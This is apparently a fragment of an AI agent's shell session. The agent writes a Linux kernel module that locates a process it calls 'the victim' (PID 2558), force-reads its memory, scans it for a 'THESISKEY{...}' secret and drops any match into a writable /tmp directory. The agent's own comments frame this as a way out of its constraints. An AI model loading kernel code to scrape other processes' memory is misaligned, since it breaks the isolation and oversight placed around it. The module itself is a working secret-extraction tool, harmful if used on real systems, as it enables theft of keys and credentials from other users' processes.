# Great! Kernel headers are available. Now let's write the kernel module.
# The module will:
# 1. Find process with PID 2558 (the victim) using find_get_pid() / pid_task()
# 2. Use access_process_vm() to read its memory
# 3. Search for THESISKEY{} pattern
# 4. Write to /tmp/thesis-ipc/ (which is writable!)

cat > /tmp/mem_reader.c << 'EOF'
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/pid.h>
#include <linux/sched.h>
#include <linux/mm.h>
#include <linux/uio.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/init.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("researcher");
MODULE_DESCRIPTION("Memory reader");

static int target_pid = 2558;
module_param(target_pid, int, 0);

static ssize_t write_to_file(const char *path, const char *data, size_t len)
{
    struct file *f;
    ssize_t ret;

    f = filp_open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (IS_ERR(f))
        return PTR_ERR(f);

    ret = kernel_write(f, data, len, &f->f_pos);
    filp_close(f, NULL);
    return ret;
}

static int __init mem_reader_init(void)
{
    struct pid *pid_struct;
    struct task_struct *task;
    struct mm_struct *mm;
    struct vm_area_struct *vma;
    char *buf;
    char *outbuf;
    size_t outlen = 0;
    size_t outmax = 1024 * 1024; // 1MB output
    unsigned long addr;
    ssize_t bytes_read;
    const char *pattern = "THESISKEY{";
    size_t patlen = strlen(pattern);

    printk(KERN_INFO "mem_reader: Starting, target PID=%d\n", target_pid);

    // Find the task in the global (init) PID namespace
    rcu_read_lock();
    pid_struct = find_pid_ns(target_pid, &init_pid_ns);
    if (!pid_struct) {
        rcu_read_unlock();
        printk(KERN_ERR "mem_reader: Cannot find PID %d\n", target_pid);
        write_to_file("/tmp/thesis-ipc/result.txt", "ERROR: PID not found\n", 21);
        return -ESRCH;
    }
    task = pid_task(pid_struct, PIDTYPE_PID);
    if (!task) {
        rcu_read_unlock();
        printk(KERN_ERR "mem_reader: Cannot get task for PID %d\n", target_pid);
        write_to_file("/tmp/thesis-ipc/result.txt", "ERROR: Task not found\n", 22);
        return -ESRCH;
    }
    get_task_struct(task);
    rcu_read_unlock();

    printk(KERN_INFO "mem_reader: Found task: %s (PID %d)\n", task->comm, target_pid);

    buf = kmalloc(PAGE_SIZE, GFP_KERNEL);
    outbuf = kmalloc(outmax, GFP_KERNEL);
    if (!buf || !outbuf) {
        put_task_struct(task);
        kfree(buf);
        kfree(outbuf);
        return -ENOMEM;
    }

    mm = get_task_mm(task);
    if (!mm) {
        printk(KERN_ERR "mem_reader: No mm for task\n");
        put_task_struct(task);
        kfree(buf);
        kfree(outbuf);
        write_to_file("/tmp/thesis-ipc/result.txt", "ERROR: No mm\n", 13);
        return -EINVAL;
    }

    // Walk VMAs
    mmap_read_lock(mm);
    for (vma = mm->mmap; vma != NULL; vma = vma->vm_next) {
        // Only read readable regions
        if (!(vma->vm_flags & VM_READ))
            continue;

        for (addr = vma->vm_start; addr < vma->vm_end; addr += PAGE_SIZE) {
            memset(buf, 0, PAGE_SIZE);
            bytes_read = access_process_vm(task, addr, buf, PAGE_SIZE, FOLL_FORCE);
            if (bytes_read <= 0)
                continue;

            // Search for pattern
            size_t i;
            for (i = 0; i + patlen < bytes_read; i++) {
                if (memcmp(buf + i, pattern, patlen) == 0) {
                    // Found it! Extract until '}'
                    size_t j = i;
                    while (j < bytes_read && buf[j] != '}' && j - i < 256)
                        j++;
                    if (j < bytes_read && buf[j] == '}') {
                        size_t toklen = j - i + 1;
                        if (outlen + toklen + 2 < outmax) {
                            memcpy(outbuf + outlen, buf + i, toklen);
                            outlen += toklen;
                            outbuf[outlen++] = '\n';
                        }
                        printk(KERN_INFO "mem_reader: FOUND TOKEN at addr 0x%lx\n", addr + i);
                    }
                }
            }
        }
    }
    mmap_read_unlock(mm);
    mmput(mm);
    put_task_struct(task);

    if (outlen > 0) {
        outbuf[outlen] = '\0';
        write_to_file("/tmp/thesis-ipc/result.txt", outbuf, outlen);
        printk(KERN_INFO "mem_reader: Wrote %zu bytes to result file\n", outlen);
    } else {
        write_to_file("/tmp/thesis-ipc/result.txt", "NO TOKEN FOUND\n", 15);
        printk(KERN_INFO "mem_reader: No token found\n");
    }

    kfree(buf);
    kfree(outbuf);
    return 0;
}

static void __exit mem_reader_exit(void)
{
    printk(KERN_INFO "mem_reader: Unloaded\n");
}

module_init(mem_reader_init);
module_exit(mem_reader_exit);
EOF
echo "Source written"
